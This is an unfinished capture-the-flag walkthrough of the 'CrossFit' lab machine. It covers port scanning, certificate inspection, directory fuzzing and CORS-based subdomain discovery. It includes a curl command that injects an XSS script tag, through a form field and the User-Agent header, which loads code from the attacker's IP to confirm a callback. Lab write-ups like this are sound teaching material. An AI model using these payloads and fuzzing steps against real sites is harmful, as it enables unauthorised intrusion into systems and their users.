This is my first insane box, done with a full walkthrough. It's kind of sporadic.

## Nmap scan

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
Service Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see three ports running. On port 21 we have FTP, with a CN `*.crossfit.htb`. On port 22 we have SSH (Debian 10). Since there's a subdomain, we could try to wfuzz the domain, but it returns nothing.

nmap tells us there's a cert on port 21, so check that out with openssl:

```bash
openssl s_client -connect 10.129.233.110:21 -starttls ftp
```

```text
Certificate chain
 0 s:C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb
```

Putting any email addresses we find in our loot bin, we use the newfound subdomain `gym-club.crossfit.htb` and put it in `/etc/hosts`.

Get on the website, look around, and run some directory fuzzing:

```bash
gobuster dir -u http://gym-club.crossfit.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This gets you `security-report`, which can't be found just clicking around. Clicking around you can also find a comment section which detects XSS and submits a report to the moderating team. You can set up a nc listener to see if your XSS works.

Instead of using XSS on the comment section itself, try it on the actual security report. Bring up the report by putting an initial XSS script, then put another into the User-Agent string to get it into the security report:

```bash
curl -s http://gym-club.crossfit.htb/blog-single.php --data 'name=0xdf&email=0xdf@crossfit.htb&phone=9999999999&message=%3Cscript+src%3D%22http%3A%2F%2F10.10.14.11%22%3E%3C%2Fscript%3E&submit=submit' -H 'User-Agent: <script src="http://10.10.14.11/"></script>'
```

This gets the admin team's system to call back to us (caught with a netcat listener). Unfortunately, their version of Firefox has nothing vulnerable in it.

Now, if you try a bunch of XSS attempts, they'll likely fail. You should try some enumeration using **CORS**. CORS makes sure only certain sites/domains can see certain information. If you can find what Crossfit explicitly allows, you can find more domains:

```bash
wfuzz -u http://gym-club.crossfit.htb/ -H "Origin: http://FUZZ.crossfit.htb" --filter "r.headers.response ~ 'Access-Control-Allow-Origin'" -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top
```

You can also use ffuf. This works because when you have a valid subdomain, it adds an `Access-Control-Allow-Origin` header. Using this, you find the **ftp** subdomain.

If you went to this subdomain directly, you'd only see the default Apache page. The way to interact with it is to make an HTTP query coming from gym-club.

> **Linked script:** the original notes embedded the JavaScript used to query the ftp subdomain from gym-club's origin.

## Box loot

**Emails**
- info@gym-club.crossfit.htb

> This box was started late at night and the Notion notes trail off here — treat this as a partial walkthrough to be continued.
